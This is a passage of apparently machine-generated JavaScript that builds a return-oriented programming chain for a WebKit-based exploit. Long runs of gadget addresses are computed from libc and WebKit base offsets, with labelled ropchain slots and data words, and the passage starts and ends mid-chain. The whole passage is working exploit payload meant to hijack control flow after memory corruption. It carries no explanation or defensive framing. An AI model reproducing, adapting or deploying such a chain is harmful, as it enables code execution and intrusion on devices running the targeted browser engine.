//L802:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96896, //L806
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96864, //L804
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96880, //L805
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96968, //L808
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L808:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97024, //L809
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L809:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97104, //L811
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L811:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L812:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L813:
db([12, 0]); // 0xc
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+97208, //L814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+97224, //L815
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+97312, //L817
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L817:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97368, //L818
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L818:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97440, //L821
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L821:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97496, //L823
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L823:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L824:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+97648, //L826
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L825:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+97736, //L828
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97752, //L829
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L828:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L829:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+97896, //L833
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+97864, //L831
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+97880, //L832
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+97968, //L835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L835:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98024, //L836
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L836:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98104, //L838
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L838:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L839:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L840:
db([13, 0]); // 0xd
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+98208, //L841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+98224, //L842
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+98312, //L844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L844:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98368, //L845
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L845:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98440, //L848
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L848:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98496, //L850
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L850:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98600, //L852
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L851:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L852:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+98688, //L854
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98704, //L855
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L854:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+98848, //L859
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+98816, //L857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+98832, //L858
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+98920, //L861
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L861:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+98976, //L862
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L862:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99056, //L864
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L864:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L865:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L866:
db([5, 0]); // 0x5
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+99160, //L867
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+99176, //L868
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L867:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L868:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+99264, //L870
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L870:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99320, //L871
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99440, //L874
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L873:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L874:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+99528, //L876
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99544, //L877
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L876:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+99688, //L881
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99656, //L879
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+99672, //L880
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L879:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L880:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+99760, //L883
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L883:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+99816, //L884
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L884:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+99896, //L886
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L886:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L887:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L888:
db([14, 0]); // 0xe
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+100000, //L889
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+100016, //L890
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+100104, //L892
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L892:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100160, //L893
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L893:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100232, //L896
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100288, //L898
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L899:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100440, //L901
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L900:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L901:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+100528, //L903
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100544, //L904
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L903:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L904:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+100688, //L908
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100656, //L906
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+100672, //L907
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L908:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+100760, //L910
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L910:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+100816, //L911
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L911:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+100896, //L913
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L913:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L914:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L915:
db([15, 0]); // 0xf
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+101000, //L916
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+101016, //L917
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+101104, //L919
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L919:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101160, //L920
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L920:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101232, //L923
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L923:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101288, //L925
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L925:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L926:
libc_base+877877, //mov rax, rdx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101440, //L928
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L927:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L928:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+101528, //L930
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101544, //L931
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L930:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L931:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+101688, //L935
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101656, //L933
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+101672, //L934
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L933:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L934:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L935:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+101760, //L937
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L937:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+101816, //L938
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L938:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+101896, //L940
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L940:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L941:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L942:
db([16, 0]); // 0x10
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+102000, //L943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+102016, //L944
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L943:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L944:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+102104, //L946
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102160, //L947
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L947:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102232, //L950
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L950:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102288, //L952
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L952:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L953:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102440, //L955
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L954:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L955:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+102528, //L957
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102544, //L958
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L957:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L958:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+102688, //L962
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102656, //L960
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+102672, //L961
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L960:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L961:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L962:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+102760, //L964
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L964:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+102816, //L965
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L965:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+102896, //L967
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L967:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L968:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L969:
db([17, 0]); // 0x11
set_gadgets([
webkit_base+1506828, //imul rax, rcx
